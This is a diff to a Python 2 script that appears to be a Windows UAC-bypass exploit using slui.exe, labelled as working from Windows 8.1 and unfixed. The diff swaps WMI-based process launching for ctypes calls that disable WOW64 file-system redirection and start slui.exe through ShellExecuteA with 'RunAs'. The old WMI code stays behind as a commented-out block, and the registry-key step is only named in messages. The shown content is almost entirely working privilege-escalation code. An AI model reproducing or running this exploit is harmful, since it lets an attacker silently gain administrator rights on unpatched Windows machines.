@@ -3,10 +3,9 @@ Works from: Windows 8.1 (9600)
 Fixed in: unfixed
 """
 import os
-import wmi
 import time
+import ctypes
 import _winreg
-import win32con
 from colorama import init, Fore
 init(convert=True)
 
@@ -25,6 +24,16 @@ def infoBox():
 	
 def warningBox():
 	return (Fore.YELLOW + '[!]' + Fore.RESET)
+
+class disable_file_system_redirection:
+    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
+    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
+    def __enter__(self):
+        self.old_value = ctypes.c_long()
+        self.success = self.disable(ctypes.byref(self.old_value))
+    def __exit__(self, type, value, traceback):
+        if self.success:
+            self.revert(self.old_value)
 
 def slui():
 	print " {} slui: Attempting to create registry key".format(infoBox())
@@ -54,6 +63,19 @@ def slui():
 	time.sleep(5)
 
 	print " {} slui: Attempting to create process".format(infoBox())
+	with disable_file_system_redirection():
+		try:
+			if (ctypes.windll.Shell32.ShellExecuteA(None,"RunAs","slui.exe",None,None,1) == 42):
+				print " {} slui: Process started successfully".format(successBox())
+			else:
+				print " {} slui: Problem creating process".format(errorBox())
+				return False
+		except Exception as error:
+			print " {} slui: Problem creating process".format(errorBox())
+			return False
+
+	"""
+	print " {} slui: Attempting to create process".format(infoBox())
 	try:
 		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start slui.exe",
 						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
@@ -64,7 +86,8 @@ def slui():
 	except Exception as error:
 		print " {} slui: Problem creating process".format(errorBox())
 		return False
-
+	"""
+	
 	print " {} slui: Pausing for 5 seconds before cleaning".format(infoBox())
 	time.sleep(5)
 
